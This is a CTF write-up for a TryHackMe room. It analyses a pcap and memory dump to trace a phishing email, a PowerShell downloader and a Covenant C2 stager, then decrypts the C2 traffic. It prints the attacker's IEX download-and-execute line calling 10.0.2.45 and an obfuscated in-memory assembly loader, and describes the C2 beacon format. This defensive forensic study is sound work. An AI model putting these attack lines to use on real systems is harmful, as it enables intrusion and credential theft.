<div align="center">

<img src="https://cdn-images.tryhackme.com/room-icons/618b3fa52f0acc0061fb0172-1749651774451" width="200">

**Difficulty:** Hard
**Category:** Network Traffic Analysis, OSINT

</div>

---



## The attacker was able to find the correct pair of credentials for the email service. What were they? Format: email:password
We are provided 2 files:
* `powershell.DMP` which is a memory DUMP file that stores a snapshot of system or application memory at the moment of a crash. Like a blue screen.
* `traffic.pcapng` - network traffic

```bash
wireshark traffic.pcapng
```

We search for `frame contains "mail"`:

![temp](assets/20260722161240.png)

SMTP is interesting since it is an email service, follow TCP stream:

```SMTP
220 mail.eventhorizon.thm ESMTP
EHLO kali
250-mail.eventhorizon.thm
250-SIZE 20480000
250-AUTH LOGIN
250 HELP
AUTH LOGIN
334 VXNlcm5hbWU6
dG9tLmRvbUBldmVudGhvcml6b24udGht
334 UGFzc3dvcmQ6
cGFzc3dvcmQ=
235 authenticated.
MAIL FROM:<tom.dom@eventhorizon.thm>
250 OK
RCPT TO:<dom.mark@eventhorizon.thm>
250 OK
DATA
354 OK, send.
```
Cyberchef, from base64: `dG9tLmRvbUBldmVudGhvcml6b24udGht` & `cGFzc3dvcmQ` gives me:

`tom.dom@e<REDACTED>word`

## What was the body of the email that was sent by the attacker?

Same stream:

![temp](assets/20260722161624.png)

`DATA` means that the user wants to send an email. 

Body:
```
Tom! I have don<REDACTED> Your BEst friend DOm
```

Filename: `eventhorizon.ps1`.
Contents:
```
IyBDb25zdGFudHMKJEcgPSA2LjY3NDMwZS0xMSAgIyBHcmF2aXRhdGlvbmFsIGNvbnN0YW50ICht
XjMga2deLTEgc14tMikKJEMgPSAyOTk3OTI0NTggICAgIyBTcGVlZCBvZiBsaWdodCAobS9zKQok
c29sYXJNYXNzID0gMS45ODllMzAgICMgTWFzcyBvZiB0aGUgU3VuIChrZykKCiMgRnVuY3Rpb24g
dG8gY2FsY3VsYXRlIHRoZSBTY2h3YXJ6c2NoaWxkIHJhZGl1cyBvZiBhIGJsYWNrIGhvbGUKZnVu
Y3Rpb24gR2V0LVNjaHdhcnpzY2hpbGRSYWRpdXMgewogICAgcGFyYW0gKAogICAgICAgIFtkb3Vi
bGVdJG1hc3MgICMgTWFzcyBvZiB0aGUgYmxhY2sgaG9sZSAoa2cpCiAgICApCiAgICByZXR1cm4g
KDIgKiAkRyAqICRtYXNzKSAvICgkQyAqICRDKQp9CgojIEZ1bmN0aW9uIHRvIGNhbGN1bGF0ZSB0
aGUgbWFzcyBvZiBhIGJsYWNrIGhvbGUgZ2l2ZW4gaXRzIHJhZGl1cwpmdW5jdGlvbiBHZXQtQmxh
Y2tIb2xlTWFzcyB7CiAgICBwYXJhbSAoCiAgICAgICAgW2RvdWJsZV0kcmFkaXVzICAjIFJhZGl1
cyBvZiB0aGUgYmxhY2sgaG9sZSAobSkKICAgICkKICAgIHJldHVybiAoJHJhZGl1cyAqICRDICog
JEMpIC8gKDIgKiAkRykKfQoKIyBHaXZlbiByYWRpdXMgb2YgdGhlIFN1biAoYXBwcm94aW1hdGUp
CiRzdW5SYWRpdXMgPSA2Ljk2MzQyZTggICMgUmFkaXVzIG9mIHRoZSBTdW4gKG1ldGVycykKCiMg
Q2FsY3VsYXRlIHRoZSBtYXNzIG9mIGEgYmxhY2sgaG9sZSB3aXRoIHRoZSBzYW1lIHJhZGl1cyBh
cyB0aGUgU3VuCiRibGFja0hvbGVNYXNzID0gR2V0LUJsYWNrSG9sZU1hc3MgLXJhZGl1cyAkc3Vu
UmFkaXVzCgojIERpc3BsYXkgcmVzdWx0cwpXcml0ZS1PdXRwdXQgIlRoZSBtYXNzIG9mIGEgYmxh
Y2sgaG9sZSBCQiB3aGljaCBoYXMgdGhlIHNhbWUgcmFkaXVzIGFzIHRoZSBTdW4gaXMgYXBwcm94
aW1hdGVseSAkKCRibGFja0hvbGVNYXNzLzFlMzApIHNvbGFyIG1hc3Nlcy4iCldyaXRlLU91dHB1
dCAiSW4ga2lsb2dyYW1zLCB0aGlzIGlzIGFwcHJveGltYXRlbHkgJGJsYWNrSG9sZU1hc3Mga2cu
IgoKSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8x
MC4wLjIuNDUvcmFkaXVzLnBzMScpCg==
```

Translated:
```
# Constants
$G = 6.67430e-11  # Gravitational constant (m^3 kg^-1 s^-2)
$C = 299792458    # Speed of light (m/s)
$solarMass = 1.989e30  # Mass of the Sun (kg)

# Function to calculate the Schwarzschild radius of a black hole
function Get-SchwarzschildRadius {
    param (
        [double]$mass  # Mass of the black hole (kg)
    )
    return (2 * $G * $mass) / ($C * $C)
}

# Function to calculate the mass of a black hole given its radius
function Get-BlackHoleMass {
    param (
        [double]$radius  # Radius of the black hole (m)
    )
    return ($radius * $C * $C) / (2 * $G)
}

# Given radius of the Sun (approximate)
$sunRadius = 6.96342e8  # Radius of the Sun (meters)

# Calculate the mass of a black hole with the same radius as the Sun
$blackHoleMass = Get-BlackHoleMass -radius $sunRadius

# Display results
Write-Output "The mass of a black hole BB which has the same radius as the Sun is approximately $($blackHoleMass/1e30) solar masses."
Write-Output "In kilograms, this is approximately $blackHoleMass kg."

IEX(New-Object <REDACTED>tp://10.0.2.45/radius.ps1')
```

Some physics and downloads and executes a file `radius.ps1` from IP `10.0.2.45`.

## What command initiated the malicious script download?
```
IEX(New-Object <REDACTED>tp://10.0.2.45/radius.ps1')
```


## What is the initial AES key that is used for decrypting the C2 traffic?

Here I looked into the `radius.ps1` binary and found this stream:

![temp](assets/20260722163808.png)

We have the entire file, lets break it down:

```
sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(...),[IO.Compression.CompressionMode]::Decompress));

sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null
```

This is a `obfuscated PowerShell loader`, it does this:
1. Decodes a Base64 string.
2. Decompresses it using Deflate.
3. Loads the result bytes as a .NET assembly (executable or DLL) directly into memory.
4. Executes its entry point.

It never writes the executable to disk! Only keeps it in memory (RAM).

### 1 Creates a Memory Stream
```powershell
sv o (New-Object IO.MemoryStream)
```
`sv` alias for `Set-Variable`.
* Creates a memory stream and stores it in the variable `o`.
### 2 Base64 decode + Deflate decompress
```powershell
sv d (
	New-Object IO.Compression.DeflateStream(
		[IO.MemoryStream][Convert]::FromBase64String("...")
		,[IO.Compression.CompressionMode]::Decompress
	)
)
```
This does:
`Base64 string -> Convert.FromBase64String() -> MemoryStream -> DeflateStream (decompress)`

The Base64 string is not the executable itself - it is a compressed blob (assembly).

### 3 Read the decompressed bytes
```powershell
sv b (New-Object Byte[](1024))
```
Creates a 1024 size Byte array and stores it in variable `b`.

Then:
```powershell
sv r (gv d).Value.Read((gv b).Value,0,1024)

while((gv r).Value -gt 0){
	(gv o).Value.write((gv b).Value,0,(gv r).Value)
	sv r (gv d).Value.Read((gv b).Value,0,1024)
}
```
`gv` alias for `Get-Variable`.

It repeatedly:
* reads 1024 from the Deflate stream
* writes them into the output MemoryStream
* repeats until EOF

C# pseudocode:
```C#
while ((bytesRead = stream.Read(buffer)) > 0)
{
	output.Write(buffer, 0, bytesRead);
}
```

### 4 Load the assembly
```powershell
[Reflection.Assembly]::Load((gv o).Value.ToArray())
```
This loads the decompressed bytes as a `.NET assembly` directly into memory!

Nothing written to disk!

### 5 Execute it
```powershell
.EntryPoint.Invoke(
	0,
	@(,[string[]]@())
)
```
This calls the assembly's `Main()` method.

Equivalent to:
```C#
assembly.EntryPoint.Invoke(nul, new object[]{ new string[0] });
```

### 6 Supress output
```powershell
| Out-Null
```
Any output is discarded.

## Overall flow
1. **Base64 blob**
2. **Decode Base64**
3. **Deflate decompress**
4. **Raw .NET executable**
5. **Assembly.Load()**
6. **Invoke Main()**

I can enter the Base64 string into cyberchef and choose `From Base64 -> Raw inflate` nad I get the classic:

![temp](assets/20260722165820.png)

`MZ` and `..cannot be run in DOS mode`. (Windows executable).

I download the exe file and get the md5hash from it:

```bash
md5sum download.exe
```

![temp](assets/20260723083648.png)

It gets very flagged as a trojan. We can look at the details and tell it is a .NET executable:

![temp](assets/20260723084438.png)

This part is really cool:

* I open vscode on my host machine (kali vscode did not have this extension) and download the extension: `ilspy-vscode`:

![temp](assets/20260723085057.png)

**Decompile MSIL assemblies - support for full framework, .NET Core and .NET Standard.**

So with this, we can decompile the binary and look at the source code:

* I hit `ctrl` + `shift` + `p` and search for `ILSpy: Pick assembly or package from file system`. I choose `download.exe` and I find this folder at the bottom:

![temp](assets/20260723085316.png)

I look inside `download/GruntStager/GruntStager/Main`:

![temp](assets/20260723085405.png)

Main creates a new `GruntStager();`:

![temp](assets/20260723085429.png)

GruntStager calls `ExecuteStager();`:

![temp](assets/20260723085456.png)

Here we find the source code!

![temp](assets/20260723085520.png)

This line caught my eye for the AES key!

```
l86TfRDvvJ<REDACTED>+wz+aYy3/s8=
```

By looking at the source code we can see:
*  C2 server is `http://10.0.2.45:8081`.
* Headers (B64 encoded):
	* User-Agent
		* Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
	* Cookie
		* ASPSESSIONID={GUID}; SESSIONID=1552332971750
* Something with `/en-us/index.html`.

Combining this with the network traffic is interesting:

I search for `frame contains "Hello World"` in wireshark and follow the first `HTTP` stream that comes up:

![temp](assets/20260723093725.png)

We can see the first `GET` request which has the `host` and `headers` that was found in the exe file.

For the `cookie`, it has the `SESSIONID` (since it is hardcoded) but not the `ASPSESSIONID`. 
This is only sent after it has gotten the first response, its like the first part is just setting up the C2 stream before it starts sending data.

I find this line in the source code:

```C#
string format = "i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73".Replace(Environment.NewLine, "\n");
```

This sets the format for all of the POST requests, it starts with `i=a19ea23062db990386a3a478cb89d52e` which is an "identifier?", then the `data={0}` which contains the B64 encoded message. Ends with  `session=75db-99b1-25fe4e9afbe58696-320bea73`.

The thing I find weird is that the server (10.0.2.46) responds with the same Hello World document every time, just different B64 strings in the `<body>`:

![temp](assets/20260723094606.png)

![temp](assets/20260723094614.png)

I understand that the binary `download.exe` is run on the target server, but then, why is the headers like `User-Agent` hardcoded? That should be on the attacker side? It might be that the server should accept those headers?

This is how it is:

The GET `/en-us/test.html` is sent from the target server to the attacker controlled C2, this is why the headers are hardcoded, to impersonate Google Chrome. The server initiates the communication channel by sending a GET request to check for a valid connection? Then it sends a POST request with encrypted data when it has gotten a response.

The hello world part of the binary (in `string format2`) is probably for the target server to parse the data sent from the C2 server?

```c#
string format2 = "<html>\n <head>\n <title>Hello World!</title>\n </head>\n <body>\n <p>Hello World!</p>\n // Hello World! {0}\n </body>\n</html>".Replace(Environment.NewLine, "\n");
```

The `{0}`part in both the requests and responses is where the B64 data is sent.

The three strings:
```C#
List<string> list4 = (from U in "L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==".Split(new char[1] { ',' }).ToList()
```

Translate to:
* `/en-us/index.html`
* `/en-us/docs.html` 
* `/en-us/test.html`

It is these URLs that show up with the `frame contains "Hello World"`, the malware chooses one of those to use for the C2 traffic.

**NOTE: This is a Covenant C2 HTTP stager, an open-source .NET C2 framework**


## What is the Administrator NTLM hash that the attacker found?

Searching for "How to decrypt Covenant C2 traffic" I found this repo:

https://github.com/naacbin/CovenantDecryptor

It explains how the Covenant communication works:

* Stage0:
	* The infected agent initiates an RSA session by transmitting a public key encrypted using the `SetupAESKey`, which is embedded in the executable, in this case the answer to the previous question? Also formats the text with the type set to 0.
	* The C2 transfers a `SessionKey`, encrypted with the RSA public key (which was sent encrypted with the AES setup key). 
* Stage1: 
	* The infected agent employs the `SetupAESKey` to decrypt the message, and then leverages the RSA private key to decryptthe `SessionKey`. Afterwards, it encrypts 4 randomly generated bytes with the `SessionKey` and transmits them. Before sending, it formats the text as described in "GruntHTTPStager" wit the type set to 1. 
	* The C2 decrypts the 4 bytes using the `SessionKey`, appends 4 additional randomly generated bytes and transfers the resulting 8 bytes data to the infected client.
* Stage2: 
	* The infected agent decrypts the 8 bytes with the `SessionKey`. It checks the first 4 bytes so that it matches what it had sent at first, then proceeds to transfer the last 4 bytes back to the C2. Before sending, it formats the text as described in "GruntHTTPStager" with the type set to 2.
	* The C2 decrypts the 4 bytes and verifies if they correspond to thoit had transmitted earlier.

After all of this is done, data can be exchanged.

So when the infected agent sends the first 4 bytes which the C2 appends 4 additional bytes to and sends back. When this all comes back and the infected agent decrypts it, if the first 4 bytes are the same as it had sent back, it is confirmed that the C2 and the infected agent uses the same key for encrypting and decrypting. 

**What do we need to decrypt the traffic?**

* The data traffic of Covenant extracted from a network capture and stored in a seperate file. 
	* Could we use the original PCAP or should we extract some parts of it? Probably keep the entire original since it has all the traffic in it, we might need it all.
* The AES key embedded in the stage 0 binary. This is what we got as the answer for the previous question.
* A minidump file of an infected process. 
	* The `DMP` file we got at the beginning.


Usage:

```bash
git clone https://github.com/naacbin/CovenantDecryptor.git
cd CovenantDecryptor
python3 -m venv .
source /bin/activate
pip install -r requirements.txt

python3 decrypt_covenant_traffic.py modulus -i traffic.txt -k "<AES_KEY>" -t base64
```

I created a `traffic.txt` that contains the HTTP stream I looked at earlier.

I get this:

![temp](assets/20260723101957.png)

Okay, the tool expects only the stage0 data message block:
```
i=a19ea23062db990386a3a478cb89d52e&data=eyJHVUlEIjoiNTZmMjM2ZTUyMDlkZmFhNTNhYWEiLCJUeXBlIjowLCJNZXRhIjoiIiwiSVYiOiIzVFhPWm1hNG90bDFOUHI3cDJaZ0JBPT0iLCJFbmNyeXB0ZWRNZXNzYWdlIjoidXRSb0E5SWZsR3BNNS8ySUZDSURwVW1QNU1GMWJwTWwyQ3ZEVU5VcSt5TEhrZTBTQVJXQWlWMjM4ZVdyays1TUdEMkZhY0xFWDhhdFdyMHJPQzY3YzJWZWlNL09TK3NTN2EvamJQRGZxbW1XTEZlZ0s3MG9JZHgxQzlrN0tJV1RIeVJxZndRbTN1TCtUdkJCM0ZEUkUwWGtNbnRRL3F6ZkdWYUNYL3ZtSmRhbEh3b0w3dU1WYkNDakR2c2hIeVRMeEFpQUFlSHV5bThCK1RDUUFWQkdEMjBpS29mVzFvcUw4ZDg3WCtXR3pqOENJUWFHSkI5aWt4UG9ISE5wTTNndW9IWkxCTmxmN1dVMmlPem1NUzE5NjE2RzRtR1lOTVFXWU01T2VXOEFxTnIrd2VzbXpSWGdMbUFNSFFKdzB5Z25uazgzY1psZFlUK2dsRUhuZi9jNkkrTER1WFMzeXBnU29GY3dSeTJ0TVdSZmpaMjErMjUvNVdCSUE4MUFJeFF1b0pSd3pEZUJsYVR3RTNkZGhMaFg1T1FldGE2aW4xNWtuQTkwY3N1akl5VFJHTG4rWlZyK293Qks3MjdJSTJNSUIxNXBwWUNHVGkvcGxRT3c0ME5oZGF4aGVOemxpWjRGU0FUd0lHN3l6eU5yTm5ZbnFhcEVLSC9peWJLLzdlNGVuTkNTclp1ZkFLalRsV3NLQStBM3VqZ2Q1NU5BSTFwTEtaemhkY1pOcVl3PSIsIkhNQUMiOiJuRUxSSldRMDh6d2NCdW00QzJWbHVSaDN5bmpnNzY5TWM2WTcrSmszRGo4PSJ9&session=75db-99b1-25fe4e9afbe58696-320bea73
```

![temp](assets/20260723102235.png)

Which contains the AES key.

Now we have the "modulus":

![temp](assets/20260723102318.png)

```bash
python3 extract_privatekey.py -i powershell.DMP -m <modulu> -o ./findings
```

![temp](assets/20260723102657.png)

```bash
cat findings/privkey1.pem
-----BEGIN RSA PRIVATE KEY-----
....
```

We got a private RSA key! Cool!

```bash
python3 decrypt_covenant_traffic.py key -i stage0traffic.txt -k <AES_KEY> -t base64 -r findings/privkey1.pem -s 1
```

![temp](assets/20260723103413.png)

The repo says **"Recover the `SessionKey` from the stage 0 response of Covenant C2, which is employed to encrypt network traffic"**

If we look at the "stage0:" description above we see that the `SessionKey` is first seen when the C2 responds to the first message from the infected agent. So we need to look at a different data block:

![temp](assets/20260723103644.png)

This is the block that should contain the `SessionKey`:

```bash
python3 decrypt_covenant_traffic.py key -i stage0C2traffic.txt -k <AES_KEY> -t base64 -r findings/privkey1.pem -s 1
```

I still get the "base64 packet not found".

By filtering for `http` in wireshark I go to the first POST request and follow the stream:

![temp](assets/20260723104349.png)

I try taking this blob instead:

Still base64 packet not found.

This stream is before the one I tried with earlier, so it should be correct, does it have a different modulus and private key? It shouldnt?

BRUH, the thing I was missing was a `=` at the end of the B64 blob. Isn't this just padding????

We got a new AES key now:

```bash
python3 decrypt_covenant_traffic.py key -i stage0C2traffic.txt --key <AES_KEY> -t base64 -r findings/privkey1.pem
```

![temp](assets/20260723105513.png)

Now with this AES key we should be able to decrypt all the traffic!

```bash
python3 decrypt_covenant_traffic.py decrypt -i ../traffic.txt -k $(cat newAESkey.txt) -t hex -s 2 
```

Now we get a lot of output!

![temp](assets/20260723110005.png)

We can see that mimikatz is used.

```
Administrator\n  Hash NTLM: 13b1e<REDACTED>11a09f
```

## What is the flag?

WHAT FLAG???

We still have a large blob string as `"status":"2","output":"loooooooooooooong string".`

We know from earlier that when the type is set to 2 the entire verification is done and actual data can be sent. So this blob must be data of some sort. In fact, we have a last blob with `"status":"3"` aswell?

We take the blob from status 2 into cyberchef and see this:

![temp](assets/20260723111010.png)

We can render image:
![temp](assets/20260723141440.png)

```
FLAG{ABOVE_<REDACTED>NT_HORIZON}
```